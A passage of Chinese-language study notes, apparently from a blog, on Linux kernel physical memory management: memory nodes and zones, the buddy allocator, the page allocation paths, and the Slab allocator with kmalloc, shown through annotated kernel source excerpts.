平台没有高内存区</p></li><li><p>Linux 里可以查看机器上的内存区</p></li></ul></blockquote></li><li><p>Linux 使用 <code>pglist_data</code> 数据结构表示一个内存节点，Linux 对 NUMA 进行了抽象<sup class="footnote-ref"><a href="#fn14" id="fnref14">[14]</a></sup>，它可以将一整块连续物理内存的划分成若干 node，也可以把不是连续的物理内存当成 UMA，在本节点中分配不到内存页面的时候，就会到其它节点中分配内存页面</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">enum</span> <span class="token punctuation">{</span>    ZONELIST_FALLBACK<span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_NUMA</span></span>    ZONELIST_NOFALLBACK<span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    MAX_ZONELISTS<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">zoneref</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">zone</span> <span class="token operator">*</span>zone<span class="token punctuation">;</span><span class="token comment">//内存区指针</span>    <span class="token keyword">int</span> zone_idx<span class="token punctuation">;</span>     <span class="token comment">//内存区对应的索引</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">zonelist</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">zoneref</span> _zonerefs<span class="token punctuation">[</span>MAX_ZONES_PER_ZONELIST <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//zone枚举类型 从0开始</span><span class="token keyword">enum</span> <span class="token class-name">zone_type</span> <span class="token punctuation">{</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_ZONE_DMA</span></span>    ZONE_DMA<span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_ZONE_DMA32</span></span>    ZONE_DMA32<span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    ZONE_NORMAL<span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_HIGHMEM</span></span>    ZONE_HIGHMEM<span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    ZONE_MOVABLE<span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_ZONE_DEVICE</span></span>    ZONE_DEVICE<span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    __MAX_NR_ZONES<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//定义MAX_NR_ZONES为__MAX_NR_ZONES 最大为6</span><span class="token function">DEFINE</span><span class="token punctuation">(</span>MAX_NR_ZONES<span class="token punctuation">,</span> __MAX_NR_ZONES<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//内存节点</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">pglist_data</span> <span class="token punctuation">{</span>    <span class="token comment">//定一个内存区数组，最大为6个zone元素</span>    <span class="token keyword">struct</span> <span class="token class-name">zone</span> node_zones<span class="token punctuation">[</span>MAX_NR_ZONES<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//两个zonelist，一个是指向本节点的的内存区，另一个指向由本节点分配不到内存时可选的备用内存区</span>    <span class="token keyword">struct</span> <span class="token class-name">zonelist</span> node_zonelists<span class="token punctuation">[</span>MAX_ZONELISTS<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//本节点有多少个内存区</span>    <span class="token keyword">int</span> nr_zones<span class="token punctuation">;</span>     <span class="token comment">//本节点开始的page索引号</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> node_start_pfn<span class="token punctuation">;</span>    <span class="token comment">//本节点有多少个可用的页面 </span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> node_present_pages<span class="token punctuation">;</span>    <span class="token comment">//本节点有多少个可用的页面包含内存空洞 </span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> node_spanned_pages<span class="token punctuation">;</span>    <span class="token comment">//节点id</span>    <span class="token keyword">int</span> node_id<span class="token punctuation">;</span>    <span class="token comment">//交换内存页面相关的字段</span>    wait_queue_head_t kswapd_wait<span class="token punctuation">;</span>    wait_queue_head_t pfmemalloc_wait<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>kswapd<span class="token punctuation">;</span>     <span class="token comment">//本节点保留的内存页面</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>       totalreserve_pages<span class="token punctuation">;</span>    <span class="token comment">//自旋锁</span>    spinlock_t      lru_lock<span class="token punctuation">;</span><span class="token punctuation">}</span> pg_data_t<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>数据结构之间的关系</strong></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220809-physical-memory-management.jpg" alt=""></p></li></ul><h4 id="伙伴算法">伙伴算法</h4><ul><li><p>场景：内核在很多情况下，需要申请连续的页框，而且数量不定</p></li><li><p>Linux 物理内存页面管理中，连续且相同大小的 pages 就可以表示成伙伴</p></li><li><p>Linux 把所有的空闲页框分组为11个块链表（<code>#define MAX_ORDER 11</code>），每个链表上的页框块是固定的，在第i条链表中每个页框块都包含$2^i$个连续页，每个页框块的第一个页框的物理地址是该块大小的整数倍（例如：大小为16个页框的块其起始地址是$16 \times 2^{12}$的倍数）</p></li><li><p>假设连续的物理内存，各页面块左右的页面，要么是等同大小，要么就是整数倍，而且还是偶数，形同伙伴</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220114-buddy.png" alt=""></p></li><li><p>伙伴管理算法的申请过程：如果申请指定大小的页面在其页面块链表中不存在，则会往高阶的页面块链表进行查找，直到找到为止，如果在高阶的页面块链表找到空闲的页面块，则会将其拆分为两块，如果拆分后仍比需要的大，那么继续拆分，直至到大小刚好为止</p></li><li><p>伙伴管理算法的释放过程：当某块页面被释放时，且其存在空闲的<strong>伙伴页面块</strong>（两个页面块的大小相同且两者的物理地址连续），则算法会将其两者合并为一个大的页面块，合并后的页面块如果还可以找到伙伴页面块，则会继续合并，直至到大小为$2^{MAX_ORDER}$个页面为止</p><blockquote><p>如何分配 4M 以上内存：</p><ol><li><p>修改MAX_ORDER</p></li><li><p>内核启动选型传递"mem="参数，预留部分内存</p></li><li><p>在start_kernel中mem_init函数之前调用alloc_boot_mem函数预分配大块内存</p></li><li><p>vmalloc 函数：分配在虚拟内存中连续但在物理内存中不一定连续的内存</p><p>…</p></li></ol></blockquote></li></ul><h4 id="反碎片机制">反碎片机制</h4><h4 id="分配内存页面">分配内存页面</h4><ul><li><p>页框操作函数</p><ul><li><p><code>alloc_pages()</code>：分配$2^{order}$个连续的物理页，并返回一个指针，指向第一个页的page结构体</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span><span class="token function">alloc_pages</span><span class="token punctuation">(</span>gfp_t gfp_mask<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> order<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><code>page_address()</code>：返回page页面所映射的的虚拟地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">page_address</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>分配物理内存页面的过程：首先要找到内存节点，接着找到内存区，然后合适的空闲链表，最后在其中找到页的 page 结构，完成物理内存页面的分配</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220810-alloc-pages.png" style="zoom:80%;"></li><li><p>所有的接口函数都会调用到 <code>alloc_pages</code> 函数，而这个函数最终会调用 <code>__alloc_pages_nodemask</code> 函数完成内存页面的分配</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span><span class="token function">alloc_pages_current</span><span class="token punctuation">(</span>gfp_t gfp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> order<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">mempolicy</span> <span class="token operator">*</span>pol <span class="token operator">=</span> <span class="token operator">&amp;</span>default_policy<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>gfp <span class="token operator">&amp;</span> __GFP_THISNODE<span class="token punctuation">)</span><span class="token punctuation">)</span>        pol <span class="token operator">=</span> <span class="token function">get_task_policy</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pol<span class="token operator">-&gt;</span>mode <span class="token operator">==</span> MPOL_INTERLEAVE<span class="token punctuation">)</span>        page <span class="token operator">=</span> <span class="token function">alloc_page_interleave</span><span class="token punctuation">(</span>gfp<span class="token punctuation">,</span> order<span class="token punctuation">,</span> <span class="token function">interleave_nodes</span><span class="token punctuation">(</span>pol<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token comment">//gfp_t 用位的状态表示请求分配不同的内存区的内存页面，以及分配内存页面的不同方式</span>        page <span class="token operator">=</span> <span class="token function">__alloc_pages_nodemask</span><span class="token punctuation">(</span>gfp<span class="token punctuation">,</span> order<span class="token punctuation">,</span>                <span class="token function">policy_node</span><span class="token punctuation">(</span>gfp<span class="token punctuation">,</span> pol<span class="token punctuation">,</span> <span class="token function">numa_node_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token function">policy_nodemask</span><span class="token punctuation">(</span>gfp<span class="token punctuation">,</span> pol<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> page<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>__alloc_pages_nodemask</code> 函数：1）准备分配页面的参数；2）进入快速分配路径；3）若快速分配路径没有分配到页面，就进入慢速分配路径</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span><span class="token function">__alloc_pages_nodemask</span><span class="token punctuation">(</span>gfp_t gfp_mask<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> order<span class="token punctuation">,</span> <span class="token keyword">int</span> preferred_nid<span class="token punctuation">,</span>  nodemask_t <span class="token operator">*</span>nodemask<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> alloc_flags <span class="token operator">=</span> ALLOC_WMARK_LOW<span class="token punctuation">;</span>    gfp_t alloc_mask<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">alloc_context</span> ac <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment">//分配页面的order大于等于最大的order直接返回NULL</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>order <span class="token operator">&gt;=</span> MAX_ORDER<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">WARN_ON_ONCE</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>gfp_mask <span class="token operator">&amp;</span> __GFP_NOWARN<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    gfp_mask <span class="token operator">&amp;=</span> gfp_allowed_mask<span class="token punctuation">;</span>    alloc_mask <span class="token operator">=</span> gfp_mask<span class="token punctuation">;</span>    <span class="token comment">//准备分配页面的参数放在ac变量中</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prepare_alloc_pages</span><span class="token punctuation">(</span>gfp_mask<span class="token punctuation">,</span> order<span class="token punctuation">,</span> preferred_nid<span class="token punctuation">,</span> nodemask<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ac<span class="token punctuation">,</span> <span class="token operator">&amp;</span>alloc_mask<span class="token punctuation">,</span> <span class="token operator">&amp;</span>alloc_flags<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    alloc_flags <span class="token operator">|=</span> <span class="token function">alloc_flags_nofragment</span><span class="token punctuation">(</span>ac<span class="token punctuation">.</span>preferred_zoneref<span class="token operator">-&gt;</span>zone<span class="token punctuation">,</span> gfp_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//进入快速分配路径</span>    page <span class="token operator">=</span> <span class="token function">get_page_from_freelist</span><span class="token punctuation">(</span>alloc_mask<span class="token punctuation">,</span> order<span class="token punctuation">,</span> alloc_flags<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ac<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">goto</span> out<span class="token punctuation">;</span>    alloc_mask <span class="token operator">=</span> <span class="token function">current_gfp_context</span><span class="token punctuation">(</span>gfp_mask<span class="token punctuation">)</span><span class="token punctuation">;</span>    ac<span class="token punctuation">.</span>spread_dirty_pages <span class="token operator">=</span> false<span class="token punctuation">;</span>    ac<span class="token punctuation">.</span>nodemask <span class="token operator">=</span> nodemask<span class="token punctuation">;</span>    <span class="token comment">//进入慢速分配路径</span>    page <span class="token operator">=</span> <span class="token function">__alloc_pages_slowpath</span><span class="token punctuation">(</span>alloc_mask<span class="token punctuation">,</span> order<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ac<span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token operator">:</span>    <span class="token keyword">return</span> page<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="快速分配路径">快速分配路径</h5><h5 id="慢速分配路径">慢速分配路径</h5><h3 id="Slab-分配器">Slab 分配器</h3><ul><li><p>引入：现实中更多要以内核对象为单位分配内存，这些数据结构实例变量的大小通常从几十到几百字节不等，远小于一个页面的大小，如果为此分配一个页面无疑是对内存资源的浪费</p></li><li><p>slab 用于实现内核中更小粒度的内存分配，减少伙伴算法在分配小块连续内存时所产生的内部碎片</p></li><li><p>将频繁使用的对象缓存起来，减少分配、初始化和释放对象的时间开销，通过着色技术调整对象以更好的使用硬件高速缓存</p></li><li><p>slab 分配器中，每一类对象拥有一个*“cache”*，对象从 cache 处获取内存，而 cache 则从 buddy 系统获取内存，因此在物理上是连续的；一个 cache 分成了若干个 slabs，同一 cache 中的 slabs 都存储相同的对象，而 slabs 由一个或者多个物理上连续的页组成</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220114-slab.png" style="zoom: 67%;"></li></ul><h4 id="Slab-对象">Slab 对象</h4><ul><li><p>Slab 分配器中把一个内存页面或一组连续的内存页面，划分成大小相同的块，其中这一个小的内存块就是==Slab 对象==，但是这一组连续的内存页面中不只是 Slab 对象，还有==Slab 管理头==和==着色区==</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220810-slab.jpg" style="zoom:80%;"></li><li><p>着色区是一块动态的内存块，建立 Slab 时才会设置大小，目的是为了错开不同 Slab 中的对象地址，降低硬件 Cache 行中的地址争用，以免导致 Cache 抖动效应</p></li><li><p>Slab 头是一个数据结构，但是不一定放在保存对象内存页面的开始，通常会有一个保存 Slab 管理头的 Slab</p></li><li><p>在 Linux 中 Slab 管理头用 <code>kmem_cache</code> 结构来表示（一个 kmem_cache 代表一个高速缓存）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token punctuation">{</span>    <span class="token comment">//是每个CPU一个array_cache类型的变量，cpu_cache是用于管理空闲对象的 </span>    <span class="token keyword">struct</span> <span class="token class-name">array_cache</span> __percpu <span class="token operator">*</span>cpu_cache<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment">//cache大小</span>    slab_flags_t flags<span class="token punctuation">;</span><span class="token comment">//slab标志</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token comment">//对象个数</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> gfporder<span class="token punctuation">;</span><span class="token comment">//分配内存页面的order</span>    gfp_t allocflags<span class="token punctuation">;</span>    size_t colour<span class="token punctuation">;</span><span class="token comment">//着色区大小</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> colour_off<span class="token punctuation">;</span><span class="token comment">//着色区的开始偏移</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token comment">//本SLAB的名字</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span> list<span class="token punctuation">;</span><span class="token comment">//所有的SLAB都要链接起来</span>    <span class="token keyword">int</span> refcount<span class="token punctuation">;</span><span class="token comment">//引用计数</span>    <span class="token keyword">int</span> object_size<span class="token punctuation">;</span><span class="token comment">//对象大小</span>    <span class="token keyword">int</span> align<span class="token punctuation">;</span><span class="token comment">//对齐大小</span>    <span class="token keyword">struct</span> <span class="token class-name">kmem_cache_node</span> <span class="token operator">*</span>node<span class="token punctuation">[</span>MAX_NUMNODES<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//指向管理kmemcache的上层结构</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">array_cache</span> <span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> avail<span class="token punctuation">;</span><span class="token comment">//当前可用对象的数目</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> limit<span class="token punctuation">;</span><span class="token comment">//允许容纳对象的最大数目</span>    <span class="token keyword">void</span> <span class="token operator">*</span>entry<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//遵循LIFO顺序的数组</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>有多少个 CPU 就会有多少个 array_cache 类型的变量，这种为每个 CPU 构造一个变量副本的同步机制，就是<strong>每CPU变量</strong>（<code>per-cpu-variable</code>）</p></blockquote><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220810-kmemcache.png" alt=""></p></li><li><p>第一个 kmem_cache 静态定义在代码中</p></li></ul><h4 id="管理-kmem-cache">管理 kmem_cache</h4><ul><li><p>每个内存节点对应一个 <code>kmem_cache_node</code> 结构用来管理 kmem_cache 结构，它开始是静态定义的，</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">NUM_INIT_LISTS</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> MAX_NUMNODES<span class="token punctuation">)</span></span></span><span class="token comment">//定义的kmem_cache_node结构数组</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">kmem_cache_node</span> __initdata init_kmem_cache_node<span class="token punctuation">[</span>NUM_INIT_LISTS<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache_node</span> <span class="token punctuation">{</span>    spinlock_t list_lock<span class="token punctuation">;</span><span class="token comment">//自旋锁</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span> slabs_partial<span class="token punctuation">;</span><span class="token comment">//有一部分空闲对象的kmem_cache结构</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span> slabs_full<span class="token punctuation">;</span><span class="token comment">//没有空闲对象的kmem_cache结构</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span> slabs_free<span class="token punctuation">;</span><span class="token comment">//对象全部空闲kmem_cache结构</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> total_slabs<span class="token punctuation">;</span> <span class="token comment">//一共多少kmem_cache结构</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> free_slabs<span class="token punctuation">;</span>  <span class="token comment">//空闲的kmem_cache结构</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> free_objects<span class="token punctuation">;</span><span class="token comment">//空闲的对象</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> free_limit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>初始化时建立了第一个 kmem_cache 结构之后 init_list 函数负责分配内存空间</p></li><li><p>第一次分配对象时那么 Slab 模块会调用 <code>cache_grow_begin</code> 函数获取内存页面，然后用获取的页面来存放对象，随后会调用 <code>cache_grow_end</code> 函数把页面挂载到 kmem_cache_node 的链表中，并让页面指向 kmem_cache，这样 kmem_cache_node、kmem_cache、page 三者之间就联系起来了</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220810-slab-global-structure.png" alt=""></p><blockquote><p>上图中 page 可能是一组连续的 pages，但是只会把第一个 page 挂载到 kmem_cache_node，同时，slab_map_pages 函数中又让 page 指向了 kmem_cache</p></blockquote></li></ul><h4 id="Slab-分配对象">Slab 分配对象</h4><ul><li><p>Slab 分配对象过程</p><ul><li><p>根据请求分配对象的大小，查找对应的 kmem_cache</p></li><li><p>从中获取 arry_cache，然后分配对象</p></li><li><p>如果没有空闲对象，就需要在 kmem_cache 对应的 kmem_cache_node 中查找有空闲对象的 kmem_cache</p></li><li><p>如果还是没找到就要分配内存页面新增 kmem_cache</p></li></ul></li><li><p>在 Linux 内核中 kmalloc 函数经常用于分配小的缓冲区或者数据结构分配实例空间，这个函数就是 Slab 分配<strong>接口</strong>，用来分配对象</p></li><li><p>普通高速缓存：返回一个指向内存块的指针，其内存块大小至少size大小，所分配的内存在<strong>物理上是连续的</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token comment">//    </span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kzalloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token comment">//内存空间置为0</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> flags <span class="token operator">|</span> __GFP_ZERO<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回一个指向内存块的指针，其内存块大小至少size大小，所分配的内存在<strong>物理上无需连续</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">vmalloc</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> size<span class="token punctuation">)</span><span class="token comment">//    </span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">vzalloc</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> size<span class="token punctuation">)</span><span class="token comment">//内存空间置为0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>专用高速缓存</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//建立高速缓存</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span><span class="token function">kmem_cache_create</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> size_t align<span class="token punctuation">,</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>ctor<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>cat /proc/slabinfo</code> 查看所有的高速缓存</p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//从高速缓存申请内存</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span>    <span class="token keyword">void</span> <span class="token function">kmem_cache_destroy</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>s<span class="token punctuation">)</span>    <span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">slab_alloc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> caller<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="kmalloc-内核源码">kmalloc 内核源码</h3><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220116-kmalloc.png" alt=""></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">,</span> gfp_t flags<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_constant_p</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;</span> KMALLOC_MAX_CACHE_SIZE<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token function">kmalloc_large</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//...</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token function">__kmalloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//size一般不会指定</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 